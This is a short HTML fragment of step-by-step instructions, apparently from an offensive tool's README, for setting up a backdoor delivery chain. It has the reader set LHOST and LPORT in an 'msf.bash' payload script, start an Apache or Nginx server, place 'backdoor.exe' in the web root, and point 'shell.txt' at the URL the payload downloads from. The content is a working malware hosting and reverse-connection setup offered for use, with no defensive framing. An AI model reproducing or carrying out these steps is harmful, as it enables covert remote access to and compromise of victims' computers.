

<ol>
        
<h2>Instructions:</h2>

<li>Change `CH_me` with LHOST and LPORT in `msf.bash` script:</li>
        <pre><code>nano msf.bash</code></pre>
        
<li>Run the provided `msf.bash` script:</li>
        <pre><code>./msf.bash</code></pre>

<li>Start your Apache or Nginx web server.</li>
        <p>Choose one of the following commands based on your web server:</p>
        <p>For Apache:</p>
        <pre><code>sudo systemctl start apache2</code></pre>
        <p>For Nginx:</p>
        <pre><code>sudo systemctl start nginx</code></pre>

<li>Upload the file created by `msf.bash` to your web server's root directory (usually `/var/www/html`). You can use tools like `mv` to move the file:</li>
        <pre><code>mv backdoor.exe /var/www/html/</code></pre>

 <li>Open `shell.txt` :</li>
        <pre><code>sudo nano shell.txt</code></pre>

 <li>Edit the `Your_Web_Server_Ip` in `shell.txt` with your Apache or Nginx server's IP address.</li>
        <p>Replace `Your_Web_Server_Ip` with the IP address of your server, e.g.,</p>
        <pre><code>http://Your_Web_Server_Ip/backdoor.exe</code></pre>
</ol>
